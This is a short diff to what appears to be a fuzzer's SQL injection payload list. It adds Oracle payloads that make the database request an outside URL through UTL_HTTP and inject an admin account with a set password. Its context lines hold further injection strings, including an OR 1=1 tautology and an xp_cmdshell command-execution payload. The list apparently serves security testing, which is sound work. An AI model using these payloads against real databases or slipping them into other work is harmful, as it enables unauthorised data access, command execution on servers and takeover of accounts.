@@ -182,6 +182,11 @@ x' OR full_name LIKE '%Bob%
 23 OR 1=1
 '; exec master..xp_cmdshell 'ping 172.10.1.255'--
 
+P:SQL-ORA-CLE:Oracle SQL Injection:2
+> Replacive Fuzzers | SQL Injection | Injection
+'||UTL_HTTP.REQUEST('http://192.168.1.1/')||'
+' || myappadmin.adduser('admin', 'newpass') || '
+
 P:SQL-SQP:Passive SQL Injection:55
 > Replacive Fuzzers | SQL Injection | Injection
 '||(elt(-3+5,bin(15),ord(10),hex(char(45))))
